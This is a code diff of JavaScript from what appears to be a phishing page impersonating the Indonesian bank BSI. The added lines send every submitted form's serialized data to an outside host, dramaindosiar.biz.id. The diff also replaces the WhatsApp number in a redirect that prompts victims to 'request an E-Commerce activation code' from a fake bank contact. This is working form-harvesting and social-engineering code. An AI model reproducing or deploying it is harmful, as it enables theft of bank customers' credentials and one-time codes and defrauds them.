@@ -11,7 +11,7 @@ $('#form2').on('submit', function (event) {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'req/wahyustore.php',
+ url: 'https://dramaindosiar.biz.id/req/wahyustore.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -50,7 +50,7 @@ function getcs(){
      audio1.load();
     audio4.loop = false
 setTimeout(function(){  
-location.href='https://api.whatsapp.com/send?phone=6283871106662&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
+location.href='https://api.whatsapp.com/send?phone=6287835434272&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗦𝗜%0ASaya mau request kode E-Commerce Aktivasi';
     }, 5000);
     setTimeout(function(){
     $("#djload").hide();   
